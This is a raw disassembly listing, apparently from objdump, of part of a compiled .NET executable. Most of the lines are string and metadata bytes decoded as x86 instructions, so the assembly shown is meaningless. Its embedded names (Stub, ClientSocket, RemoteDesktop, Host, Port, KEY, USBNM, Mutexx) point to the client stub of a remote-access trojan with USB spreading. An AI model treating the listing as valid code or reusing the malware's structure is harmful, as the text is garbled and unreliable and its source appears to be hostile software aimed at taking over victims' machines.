  408217:	04 8a                	add    $0x8a,%al
  408219:	05 0e 06 1f 06       	add    $0x61f060e,%eax
  40821e:	37                   	aaa
  40821f:	06                   	push   %es
  408220:	7d 06                	jge    0x408228
  408222:	90                   	nop
  408223:	06                   	push   %es
  408224:	3c 02                	cmp    $0x2,%al
  408226:	b5 06                	mov    $0x6,%ch
  408228:	c6 06 50             	movb   $0x50,(%esi)
  40822b:	02 d5                	add    %ch,%dl
  40822d:	06                   	push   %es
  40822e:	ef                   	out    %eax,(%dx)
  40822f:	06                   	push   %es
  408230:	ff 06                	incl   (%esi)
  408232:	06                   	push   %es
  408233:	07                   	pop    %es
  408234:	2f                   	das
  408235:	07                   	pop    %es
  408236:	5d                   	pop    %ebp
  408237:	07                   	pop    %es
  408238:	5d                   	pop    %ebp
  408239:	07                   	pop    %es
  40823a:	70 07                	jo     0x408243
  40823c:	7d 07                	jge    0x408245
  40823e:	98                   	cwtl
  40823f:	07                   	pop    %es
  408240:	a0 07 ba 07 d5       	mov    0xd507ba07,%al
  408245:	07                   	pop    %es
  408246:	da 07                	fiaddl (%edi)
  408248:	7d 07                	jge    0x408251
  40824a:	f0 07                	lock pop %es
  40824c:	61                   	popa
  40824d:	08 a1 08 04 00 01    	or     %ah,0x1000408(%ecx)
  408253:	00 06                	add    %al,(%esi)
  408255:	00 05 00 0a 00 06    	add    %al,0x6000a00
  40825b:	00 00                	add    %al,(%eax)
  40825d:	00 2d 01 4f 00 00    	add    %ch,0x4f01
  408263:	00 e6                	add    %ah,%dh
  408265:	01 54 00 00          	add    %edx,0x0(%eax,%eax,1)
  408269:	00 95 01 59 00 00    	add    %dl,0x5901(%ebp)
  40826f:	00 f2                	add    %dh,%dl
  408271:	01 5e 00             	add    %ebx,0x0(%esi)
  408274:	00 00                	add    %al,(%eax)
  408276:	7f 02                	jg     0x40827a
  408278:	94                   	xchg   %eax,%esp
  408279:	00 00                	add    %al,(%eax)
  40827b:	00 e9                	add    %ch,%cl
  40827d:	05 2d 01 02 00       	add    $0x2012d,%eax
  408282:	04 00                	add    $0x0,%al
  408284:	03 00                	add    (%eax),%eax
  408286:	02 00                	add    (%eax),%al
  408288:	05 00 05 00 02       	add    $0x2000500,%eax
  40828d:	00 06                	add    %al,(%esi)
  40828f:	00 07                	add    %al,(%edi)
  408291:	00 02                	add    %al,(%edx)
  408293:	00 07                	add    %al,(%edi)
  408295:	00 09                	add    %cl,(%ecx)
  408297:	00 02                	add    %al,(%edx)
  408299:	00 0f                	add    %cl,(%edi)
  40829b:	00 0b                	add    %cl,(%ebx)
  40829d:	00 02                	add    %al,(%edx)
  40829f:	00 24 00             	add    %ah,(%eax,%eax,1)
  4082a2:	0d 00 01 00 25       	or     $0x25000100,%eax
  4082a7:	00 0d 00 df 04 f8    	add    %cl,0xf804df00
  4082ad:	06                   	push   %es
  4082ae:	e0 14                	loopne 0x4082c4
  4082b0:	eb 14                	jmp    0x4082c6
  4082b2:	75 00                	jne    0x4082b4
  4082b4:	75 00                	jne    0x4082b6
  4082b6:	88 00                	mov    %al,(%eax)
  4082b8:	c1 01 c8             	roll   $0xc8,(%ecx)
  4082bb:	01 cf                	add    %ecx,%edi
  4082bd:	01 d6                	add    %edx,%esi
  4082bf:	01 ce                	add    %ecx,%esi
  4082c1:	02 32                	add    (%edx),%dh
  4082c3:	04 53                	add    $0x53,%al
  4082c5:	06                   	push   %es
  4082c6:	66 06                	pushw  %es
  4082c8:	43                   	inc    %ebx
  4082c9:	01 55 00             	add    %edx,0x0(%ebp)
  4082cc:	b0 04                	mov    $0x4,%al
  4082ce:	01 00                	add    %eax,(%eax)
  4082d0:	00 01                	add    %al,(%ecx)
  4082d2:	57                   	push   %edi
  4082d3:	00 e6                	add    %ah,%dh
  4082d5:	04 03                	add    $0x3,%al
  4082d7:	00 00                	add    %al,(%eax)
  4082d9:	01 59 00             	add    %ebx,0x0(%ecx)
  4082dc:	0f 05                	syscall
  4082de:	04 00                	add    $0x0,%al
  4082e0:	43                   	inc    %ebx
  4082e1:	01 5b 00             	add    %ebx,0x0(%ebx)
  4082e4:	67 05 04 00 43 01    	addr16 add $0x1430004,%eax
  4082ea:	95                   	xchg   %eax,%ebp
  4082eb:	00 c6                	add    %al,%dh
  4082ed:	06                   	push   %es
  4082ee:	02 00                	add    (%eax),%al
  4082f0:	04 80                	add    $0x80,%al
  4082f2:	00 00                	add    %al,(%eax)
  4082f4:	01 00                	add    %eax,(%eax)
	...
  408302:	1e                   	push   %ds
  408303:	1a 00                	sbb    (%eax),%al
  408305:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  408310:	00 00                	add    %al,(%eax)
  408312:	01 00                	add    %eax,(%eax)
  408314:	0a 00                	or     (%eax),%al
  408316:	00 00                	add    %al,(%eax)
  408318:	00 00                	add    %al,(%eax)
  40831a:	0a 00                	or     (%eax),%al
	...
  408324:	00 00                	add    %al,(%eax)
  408326:	0a 00                	or     (%eax),%al
  408328:	13 00                	adc    (%eax),%eax
  40832a:	00 00                	add    %al,(%eax)
  40832c:	00 00                	add    %al,(%eax)
  40832e:	04 00                	add    $0x0,%al
	...
  408338:	00 00                	add    %al,(%eax)
  40833a:	01 00                	add    %eax,(%eax)
  40833c:	36 01 00             	add    %eax,%ss:(%eax)
  40833f:	00 00                	add    %al,(%eax)
  408341:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40834c:	00 00                	add    %al,(%eax)
  40834e:	0a 00                	or     (%eax),%al
  408350:	02 07                	add    (%edi),%al
  408352:	00 00                	add    %al,(%eax)
  408354:	00 00                	add    %al,(%eax)
  408356:	04 00                	add    $0x0,%al
	...
  408360:	00 00                	add    %al,(%eax)
  408362:	01 00                	add    %eax,(%eax)
  408364:	3c 0f                	cmp    $0xf,%al
  408366:	00 00                	add    %al,(%eax)
  408368:	00 00                	add    %al,(%eax)
  40836a:	04 00                	add    $0x0,%al
	...
  408374:	00 00                	add    %al,(%eax)
  408376:	0a 00                	or     (%eax),%al
  408378:	b3 17                	mov    $0x17,%bl
  40837a:	00 00                	add    %al,(%eax)
  40837c:	00 00                	add    %al,(%eax)
  40837e:	05 00 04 00 06       	add    $0x6000400,%eax
  408383:	00 04 00             	add    %al,(%eax,%eax,1)
  408386:	0d 00 0a 00 0f       	or     $0xf000a00,%eax
  40838b:	00 0a                	add    %cl,(%edx)
  40838d:	00 00                	add    %al,(%eax)
  40838f:	00 10                	add    %dl,(%eax)
  408391:	00 0c 00             	add    %cl,(%eax,%eax,1)
  408394:	3c 02                	cmp    $0x2,%al
  408396:	00 00                	add    %al,(%eax)
  408398:	10 00                	adc    %al,(%eax)
  40839a:	19 00                	sbb    %eax,(%eax)
  40839c:	3c 02                	cmp    $0x2,%al
  40839e:	00 00                	add    %al,(%eax)
  4083a0:	00 00                	add    %al,(%eax)
  4083a2:	1b 00                	sbb    (%eax),%eax
  4083a4:	3c 02                	cmp    $0x2,%al
  4083a6:	2d 00 5a 02 2d       	sub    $0x2d025a00,%eax
  4083ab:	00 d5                	add    %dl,%ch
  4083ad:	02 00                	add    (%eax),%al
  4083af:	00 00                	add    %al,(%eax)
  4083b1:	3c 4d                	cmp    $0x4d,%al
  4083b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b4:	64 75 6c             	fs jne 0x408423
  4083b7:	65 3e 00 6d 73       	gs add %ch,%ds:0x73(%ebp)
  4083bc:	63 6f 72             	arpl   %ebp,0x72(%edi)
  4083bf:	6c                   	insb   (%dx),%es:(%edi)
  4083c0:	69 62 00 4d 69 63 72 	imul   $0x7263694d,0x0(%edx),%esp
  4083c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4083c8:	73 6f                	jae    0x408439
  4083ca:	66 74 2e             	data16 je 0x4083fb
  4083cd:	56                   	push   %esi
  4083ce:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4083d5:	73 69                	jae    0x408440
  4083d7:	63 00                	arpl   %eax,(%eax)
  4083d9:	4d                   	dec    %ebp
  4083da:	79 41                	jns    0x40841d
  4083dc:	70 70                	jo     0x40844e
  4083de:	6c                   	insb   (%dx),%es:(%edi)
  4083df:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4083e6:	00 4d 79             	add    %cl,0x79(%ebp)
  4083e9:	00 4d 79             	add    %cl,0x79(%ebp)
  4083ec:	43                   	inc    %ebx
  4083ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4083ee:	6d                   	insl   (%dx),%es:(%edi)
  4083ef:	70 75                	jo     0x408466
  4083f1:	74 65                	je     0x408458
  4083f3:	72 00                	jb     0x4083f5
  4083f5:	4d                   	dec    %ebp
  4083f6:	79 50                	jns    0x408448
  4083f8:	72 6f                	jb     0x408469
  4083fa:	6a 65                	push   $0x65
  4083fc:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  408400:	79 57                	jns    0x408459
  408402:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  408406:	72 76                	jb     0x40847e
  408408:	69 63 65 73 00 54 68 	imul   $0x68540073,0x65(%ebx),%esp
  40840f:	72 65                	jb     0x408476
  408411:	61                   	popa
  408412:	64 53                	fs push %ebx
  408414:	61                   	popa
  408415:	66 65 4f             	gs dec %di
  408418:	62 6a 65             	bound  %ebp,0x65(%edx)
  40841b:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  40841f:	6f                   	outsl  %ds:(%esi),(%dx)
  408420:	76 69                	jbe    0x40848b
  408422:	64 65 72 60          	fs gs jb 0x408486
  408426:	31 00                	xor    %eax,(%eax)
  408428:	53                   	push   %ebx
  408429:	65 74 74             	gs je  0x4084a0
  40842c:	69 6e 67 73 00 53 74 	imul   $0x74530073,0x67(%esi),%ebp
  408433:	75 62                	jne    0x408497
  408435:	00 4d 61             	add    %cl,0x61(%ebp)
  408438:	69 6e 00 43 6c 69 65 	imul   $0x65696c43,0x0(%esi),%ebp
  40843f:	6e                   	outsb  %ds:(%esi),(%dx)
  408440:	74 53                	je     0x408495
  408442:	6f                   	outsl  %ds:(%esi),(%dx)
  408443:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408446:	74 00                	je     0x408448
  408448:	4d                   	dec    %ebp
  408449:	65 73 73             	gs jae 0x4084bf
  40844c:	61                   	popa
  40844d:	67 65 73 00          	addr16 gs jae 0x408451
  408451:	48                   	dec    %eax
  408452:	65 6c                	gs insb (%dx),%es:(%edi)
  408454:	70 65                	jo     0x4084bb
  408456:	72 00                	jb     0x408458
  408458:	52                   	push   %edx
  408459:	65 6d                	gs insl (%dx),%es:(%edi)
  40845b:	6f                   	outsl  %ds:(%esi),(%dx)
  40845c:	74 65                	je     0x4084c3
  40845e:	44                   	inc    %esp
  40845f:	65 73 6b             	gs jae 0x4084cd
  408462:	74 6f                	je     0x4084d3
  408464:	70 00                	jo     0x408466
  408466:	41                   	inc    %ecx
  408467:	70 70                	jo     0x4084d9
  408469:	65 6e                	outsb  %gs:(%esi),(%dx)
  40846b:	64 4f                	fs dec %edi
  40846d:	75 74                	jne    0x4084e3
  40846f:	70 75                	jo     0x4084e6
  408471:	74 54                	je     0x4084c7
  408473:	65 78 74             	gs js  0x4084ea
  408476:	44                   	inc    %esp
  408477:	65 6c                	gs insb (%dx),%es:(%edi)
  408479:	65 67 61             	gs addr16 popa
  40847c:	74 65                	je     0x4084e3
  40847e:	00 4d 69             	add    %cl,0x69(%ebp)
  408481:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408484:	73 6f                	jae    0x4084f5
  408486:	66 74 2e             	data16 je 0x4084b7
  408489:	56                   	push   %esi
  40848a:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408491:	73 69                	jae    0x4084fc
  408493:	63 2e                	arpl   %ebp,(%esi)
  408495:	41                   	inc    %ecx
  408496:	70 70                	jo     0x408508
  408498:	6c                   	insb   (%dx),%es:(%edi)
  408499:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4084a0:	53                   	push   %ebx
  4084a1:	65 72 76             	gs jb  0x40851a
  4084a4:	69 63 65 73 00 41 70 	imul   $0x70410073,0x65(%ebx),%esp
  4084ab:	70 6c                	jo     0x408519
  4084ad:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4084b4:	42                   	inc    %edx
  4084b5:	61                   	popa
  4084b6:	73 65                	jae    0x40851d
  4084b8:	00 2e                	add    %ch,(%esi)
  4084ba:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4084be:	00 4d 69             	add    %cl,0x69(%ebp)
  4084c1:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4084c4:	73 6f                	jae    0x408535
  4084c6:	66 74 2e             	data16 je 0x4084f7
  4084c9:	56                   	push   %esi
  4084ca:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4084d1:	73 69                	jae    0x40853c
  4084d3:	63 2e                	arpl   %ebp,(%esi)
  4084d5:	44                   	inc    %esp
  4084d6:	65 76 69             	gs jbe 0x408542
  4084d9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4084dc:	00 43 6f             	add    %al,0x6f(%ebx)
  4084df:	6d                   	insl   (%dx),%es:(%edi)
  4084e0:	70 75                	jo     0x408557
  4084e2:	74 65                	je     0x408549
  4084e4:	72 00                	jb     0x4084e6
  4084e6:	53                   	push   %ebx
  4084e7:	79 73                	jns    0x40855c
  4084e9:	74 65                	je     0x408550
  4084eb:	6d                   	insl   (%dx),%es:(%edi)
  4084ec:	00 4f 62             	add    %cl,0x62(%edi)
  4084ef:	6a 65                	push   $0x65
  4084f1:	63 74 00 2e          	arpl   %esi,0x2e(%eax,%eax,1)
  4084f5:	63 63 74             	arpl   %esp,0x74(%ebx)
  4084f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f9:	72 00                	jb     0x4084fb
  4084fb:	67 65 74 5f          	addr16 gs je 0x40855e
  4084ff:	43                   	inc    %ebx
  408500:	6f                   	outsl  %ds:(%esi),(%dx)
  408501:	6d                   	insl   (%dx),%es:(%edi)
  408502:	70 75                	jo     0x408579
  408504:	74 65                	je     0x40856b
  408506:	72 00                	jb     0x408508
  408508:	6d                   	insl   (%dx),%es:(%edi)
  408509:	5f                   	pop    %edi
  40850a:	43                   	inc    %ebx
  40850b:	6f                   	outsl  %ds:(%esi),(%dx)
  40850c:	6d                   	insl   (%dx),%es:(%edi)
  40850d:	70 75                	jo     0x408584
  40850f:	74 65                	je     0x408576
  408511:	72 4f                	jb     0x408562
  408513:	62 6a 65             	bound  %ebp,0x65(%edx)
  408516:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  40851a:	6f                   	outsl  %ds:(%esi),(%dx)
  40851b:	76 69                	jbe    0x408586
  40851d:	64 65 72 00          	fs gs jb 0x408521
  408521:	67 65 74 5f          	addr16 gs je 0x408584
  408525:	41                   	inc    %ecx
  408526:	70 70                	jo     0x408598
  408528:	6c                   	insb   (%dx),%es:(%edi)
  408529:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408530:	00 6d 5f             	add    %ch,0x5f(%ebp)
  408533:	41                   	inc    %ecx
  408534:	70 70                	jo     0x4085a6
  408536:	4f                   	dec    %edi
  408537:	62 6a 65             	bound  %ebp,0x65(%edx)
  40853a:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  40853e:	6f                   	outsl  %ds:(%esi),(%dx)
  40853f:	76 69                	jbe    0x4085aa
  408541:	64 65 72 00          	fs gs jb 0x408545
  408545:	55                   	push   %ebp
  408546:	73 65                	jae    0x4085ad
  408548:	72 00                	jb     0x40854a
  40854a:	67 65 74 5f          	addr16 gs je 0x4085ad
  40854e:	55                   	push   %ebp
  40854f:	73 65                	jae    0x4085b6
  408551:	72 00                	jb     0x408553
  408553:	6d                   	insl   (%dx),%es:(%edi)
  408554:	5f                   	pop    %edi
  408555:	55                   	push   %ebp
  408556:	73 65                	jae    0x4085bd
  408558:	72 4f                	jb     0x4085a9
  40855a:	62 6a 65             	bound  %ebp,0x65(%edx)
  40855d:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  408561:	6f                   	outsl  %ds:(%esi),(%dx)
  408562:	76 69                	jbe    0x4085cd
  408564:	64 65 72 00          	fs gs jb 0x408568
  408568:	67 65 74 5f          	addr16 gs je 0x4085cb
  40856c:	57                   	push   %edi
  40856d:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  408571:	72 76                	jb     0x4085e9
  408573:	69 63 65 73 00 6d 5f 	imul   $0x5f6d0073,0x65(%ebx),%esp
  40857a:	4d                   	dec    %ebp
  40857b:	79 57                	jns    0x4085d4
  40857d:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  408581:	72 76                	jb     0x4085f9
  408583:	69 63 65 73 4f 62 6a 	imul   $0x6a624f73,0x65(%ebx),%esp
  40858a:	65 63 74 50 72       	arpl   %esi,%gs:0x72(%eax,%edx,2)
  40858f:	6f                   	outsl  %ds:(%esi),(%dx)
  408590:	76 69                	jbe    0x4085fb
  408592:	64 65 72 00          	fs gs jb 0x408596
  408596:	41                   	inc    %ecx
  408597:	70 70                	jo     0x408609
  408599:	6c                   	insb   (%dx),%es:(%edi)
  40859a:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4085a1:	00 57 65             	add    %dl,0x65(%edi)
  4085a4:	62 53 65             	bound  %edx,0x65(%ebx)
  4085a7:	72 76                	jb     0x40861f
  4085a9:	69 63 65 73 00 45 71 	imul   $0x71450073,0x65(%ebx),%esp
  4085b0:	75 61                	jne    0x408613
  4085b2:	6c                   	insb   (%dx),%es:(%edi)
  4085b3:	73 00                	jae    0x4085b5
  4085b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4085b6:	00 47 65             	add    %al,0x65(%edi)
  4085b9:	74 48                	je     0x408603
  4085bb:	61                   	popa
  4085bc:	73 68                	jae    0x408626
  4085be:	43                   	inc    %ebx
  4085bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4085c0:	64 65 00 54 79 70    	fs add %dl,%gs:0x70(%ecx,%edi,2)
  4085c6:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4085ca:	74 54                	je     0x408620
  4085cc:	79 70                	jns    0x40863e
  4085ce:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  4085d3:	74 72                	je     0x408647
  4085d5:	69 6e 67 00 43 72 65 	imul   $0x65724300,0x67(%esi),%ebp
  4085dc:	61                   	popa
  4085dd:	74 65                	je     0x408644
  4085df:	5f                   	pop    %edi
  4085e0:	5f                   	pop    %edi
  4085e1:	49                   	dec    %ecx
  4085e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e3:	73 74                	jae    0x408659
  4085e5:	61                   	popa
  4085e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e7:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  4085ea:	5f                   	pop    %edi
  4085eb:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  4085ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f0:	73 74                	jae    0x408666
  4085f2:	61                   	popa
  4085f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f4:	63 65 00             	arpl   %esp,0x0(%ebp)
  4085f7:	44                   	inc    %esp
  4085f8:	69 73 70 6f 73 65 5f 	imul   $0x5f65736f,0x70(%ebx),%esi
  4085ff:	5f                   	pop    %edi
  408600:	49                   	dec    %ecx
  408601:	6e                   	outsb  %ds:(%esi),(%dx)
  408602:	73 74                	jae    0x408678
  408604:	61                   	popa
  408605:	6e                   	outsb  %ds:(%esi),(%dx)
  408606:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  408609:	5f                   	pop    %edi
  40860a:	00 67 65             	add    %ah,0x65(%edi)
  40860d:	74 5f                	je     0x40866e
  40860f:	47                   	inc    %edi
  408610:	65 74 49             	gs je  0x40865c
  408613:	6e                   	outsb  %ds:(%esi),(%dx)
  408614:	73 74                	jae    0x40868a
  408616:	61                   	popa
  408617:	6e                   	outsb  %ds:(%esi),(%dx)
  408618:	63 65 00             	arpl   %esp,0x0(%ebp)
  40861b:	6d                   	insl   (%dx),%es:(%edi)
  40861c:	5f                   	pop    %edi
  40861d:	54                   	push   %esp
  40861e:	68 72 65 61 64       	push   $0x64616572
  408623:	53                   	push   %ebx
  408624:	74 61                	je     0x408687
  408626:	74 69                	je     0x408691
  408628:	63 56 61             	arpl   %edx,0x61(%esi)
  40862b:	6c                   	insb   (%dx),%es:(%edi)
  40862c:	75 65                	jne    0x408693
  40862e:	00 47 65             	add    %al,0x65(%edi)
  408631:	74 49                	je     0x40867c
  408633:	6e                   	outsb  %ds:(%esi),(%dx)
  408634:	73 74                	jae    0x4086aa
  408636:	61                   	popa
  408637:	6e                   	outsb  %ds:(%esi),(%dx)
  408638:	63 65 00             	arpl   %esp,0x0(%ebp)
  40863b:	48                   	dec    %eax
  40863c:	6f                   	outsl  %ds:(%esi),(%dx)
  40863d:	73 74                	jae    0x4086b3
  40863f:	00 50 6f             	add    %dl,0x6f(%eax)
  408642:	72 74                	jb     0x4086b8
  408644:	00 4b 45             	add    %cl,0x45(%ebx)
  408647:	59                   	pop    %ecx
  408648:	00 53 50             	add    %dl,0x50(%ebx)
  40864b:	4c                   	dec    %esp
  40864c:	00 55 53             	add    %dl,0x53(%ebp)
  40864f:	42                   	inc    %edx
  408650:	4e                   	dec    %esi
  408651:	4d                   	dec    %ebp
  408652:	00 4d 75             	add    %cl,0x75(%ebp)
  408655:	74 65                	je     0x4086bc
  408657:	78 78                	js     0x4086d1
  408659:	00 53 79             	add    %dl,0x79(%ebx)
  40865c:	73 74                	jae    0x4086d2
  40865e:	65 6d                	gs insl (%dx),%es:(%edi)
  408660:	2e 54                	cs push %esp
  408662:	68 72 65 61 64       	push   $0x64616572
  408667:	69 6e 67 00 4d 75 74 	imul   $0x74754d00,0x67(%esi),%ebp
  40866e:	65 78 00             	gs js  0x408671
  408671:	5f                   	pop    %edi
  408672:	61                   	popa
  408673:	70 70                	jo     0x4086e5
  408675:	4d                   	dec    %ebp
  408676:	75 74                	jne    0x4086ec
  408678:	65 78 00             	gs js  0x40867b
  40867b:	75 73                	jne    0x4086f0
  40867d:	62 43 00             	bound  %eax,0x0(%ebx)
  408680:	63 75 72             	arpl   %esi,0x72(%ebp)
  408683:	72 65                	jb     0x4086ea
  408685:	6e                   	outsb  %ds:(%esi),(%dx)
  408686:	74 00                	je     0x408688
  408688:	69 73 43 6f 6e 6e 65 	imul   $0x656e6e6f,0x43(%ebx),%esi
  40868f:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  408693:	00 53 79             	add    %dl,0x79(%ebx)
  408696:	73 74                	jae    0x40870c
  408698:	65 6d                	gs insl (%dx),%es:(%edi)
  40869a:	2e 4e                	cs dec %esi
  40869c:	65 74 2e             	gs je  0x4086cd
  40869f:	53                   	push   %ebx
  4086a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4086a1:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4086a4:	74 73                	je     0x408719
  4086a6:	00 53 6f             	add    %dl,0x6f(%ebx)
  4086a9:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4086ac:	74 00                	je     0x4086ae
  4086ae:	53                   	push   %ebx
  4086af:	00 42 75             	add    %al,0x75(%edx)
  4086b2:	66 66 65 72 4c       	data16 data16 gs jb 0x408703
  4086b7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4086b9:	67 74 68             	addr16 je 0x408724
  4086bc:	00 42 75             	add    %al,0x75(%edx)
  4086bf:	66 66 65 72 4c       	data16 data16 gs jb 0x408710
  4086c4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4086c6:	67 74 68             	addr16 je 0x408731
  4086c9:	52                   	push   %edx
  4086ca:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4086ce:	76 65                	jbe    0x408735
  4086d0:	64 00 42 75          	add    %al,%fs:0x75(%edx)
  4086d4:	66 66 65 72 00       	data16 data16 gs jb 0x4086d9
  4086d9:	53                   	push   %ebx
  4086da:	79 73                	jns    0x40874f
  4086dc:	74 65                	je     0x408743
  4086de:	6d                   	insl   (%dx),%es:(%edi)
  4086df:	2e 49                	cs dec %ecx
  4086e1:	4f                   	dec    %edi
  4086e2:	00 4d 65             	add    %cl,0x65(%ebp)
  4086e5:	6d                   	insl   (%dx),%es:(%edi)
  4086e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4086e7:	72 79                	jb     0x408762
  4086e9:	53                   	push   %ebx
  4086ea:	74 72                	je     0x40875e
  4086ec:	65 61                	gs popa
  4086ee:	6d                   	insl   (%dx),%es:(%edi)
  4086ef:	00 4d 53             	add    %cl,0x53(%ebp)
  4086f2:	00 54 69 6d          	add    %dl,0x6d(%ecx,%ebp,2)
  4086f6:	65 72 00             	gs jb  0x4086f9
  4086f9:	54                   	push   %esp
  4086fa:	69 63 6b 00 4d 61 6e 	imul   $0x6e614d00,0x6b(%ebx),%esp
  408701:	75 61                	jne    0x408764
  408703:	6c                   	insb   (%dx),%es:(%edi)
  408704:	52                   	push   %edx
  408705:	65 73 65             	gs jae 0x40876d
  408708:	74 45                	je     0x40874f
  40870a:	76 65                	jbe    0x408771
  40870c:	6e                   	outsb  %ds:(%esi),(%dx)
  40870d:	74 00                	je     0x40870f
  40870f:	61                   	popa
  408710:	6c                   	insb   (%dx),%es:(%edi)
  408711:	6c                   	insb   (%dx),%es:(%edi)
  408712:	44                   	inc    %esp
  408713:	6f                   	outsl  %ds:(%esi),(%dx)
  408714:	6e                   	outsb  %ds:(%esi),(%dx)
  408715:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  408719:	6e                   	outsb  %ds:(%esi),(%dx)
  40871a:	64 53                	fs push %ebx
  40871c:	79 6e                	jns    0x40878c
  40871e:	63 00                	arpl   %eax,(%eax)
  408720:	42                   	inc    %edx
  408721:	65 67 69 6e 43 6f 6e 	imul   $0x656e6e6f,%gs:0x43(%bp),%ebp
  408728:	6e 65 
  40872a:	63 74 00 49          	arpl   %esi,0x49(%eax,%eax,1)
  40872e:	6e                   	outsb  %ds:(%esi),(%dx)
  40872f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408731:	00 49 41             	add    %cl,0x41(%ecx)
  408734:	73 79                	jae    0x4087af
  408736:	6e                   	outsb  %ds:(%esi),(%dx)
  408737:	63 52 65             	arpl   %edx,0x65(%edx)
  40873a:	73 75                	jae    0x4087b1
  40873c:	6c                   	insb   (%dx),%es:(%edi)
  40873d:	74 00                	je     0x40873f
  40873f:	42                   	inc    %edx
  408740:	65 67 69 6e 52 65 63 	imul   $0x69656365,%gs:0x52(%bp),%ebp
  408747:	65 69 
  408749:	76 65                	jbe    0x4087b0
  40874b:	00 61 72             	add    %ah,0x72(%ecx)
  40874e:	00 42 65             	add    %al,0x65(%edx)
  408751:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  408758:	00 
  408759:	62 00                	bound  %eax,(%eax)
  40875b:	53                   	push   %ebx
  40875c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40875e:	64 00 6d 73          	add    %ch,%fs:0x73(%ebp)
  408762:	67 00 45 6e          	add    %al,0x6e(%di)
  408766:	64 53                	fs push %ebx
  408768:	65 6e                	outsb  %gs:(%esi),(%dx)
  40876a:	64 00 69 73          	add    %ch,%fs:0x73(%ecx)
  40876e:	44                   	inc    %esp
  40876f:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  408776:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  40877a:	00 50 69             	add    %dl,0x69(%eax)
  40877d:	6e                   	outsb  %ds:(%esi),(%dx)
  40877e:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408782:	73 74                	jae    0x4087f8
  408784:	65 6d                	gs insl (%dx),%es:(%edi)
  408786:	2e 44                	cs inc %esp
  408788:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40878f:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  408796:	63 65 73             	arpl   %esp,0x73(%ebp)
  408799:	73 00                	jae    0x40879b
  40879b:	5f                   	pop    %edi
  40879c:	4d                   	dec    %ebp
  40879d:	79 50                	jns    0x4087ef
  40879f:	72 6f                	jb     0x408810
  4087a1:	63 65 73             	arpl   %esp,0x73(%ebp)
  4087a4:	73 00                	jae    0x4087a6
  4087a6:	67 65 74 5f          	addr16 gs je 0x408809
  4087aa:	4d                   	dec    %ebp
  4087ab:	79 50                	jns    0x4087fd
  4087ad:	72 6f                	jb     0x40881e
  4087af:	63 65 73             	arpl   %esp,0x73(%ebp)
  4087b2:	73 00                	jae    0x4087b4
  4087b4:	73 65                	jae    0x40881b
  4087b6:	74 5f                	je     0x408817
  4087b8:	4d                   	dec    %ebp
  4087b9:	79 50                	jns    0x40880b
  4087bb:	72 6f                	jb     0x40882c
  4087bd:	63 65 73             	arpl   %esp,0x73(%ebp)
  4087c0:	73 00                	jae    0x4087c2
  4087c2:	57                   	push   %edi
  4087c3:	69 74 68 45 76 65 6e 	imul   $0x746e6576,0x45(%eax,%ebp,2),%esi
  4087ca:	74 
  4087cb:	73 56                	jae    0x408823
  4087cd:	61                   	popa
  4087ce:	6c                   	insb   (%dx),%es:(%edi)
  4087cf:	75 65                	jne    0x408836
  4087d1:	00 70 72             	add    %dh,0x72(%eax)
  4087d4:	6f                   	outsl  %ds:(%esi),(%dx)
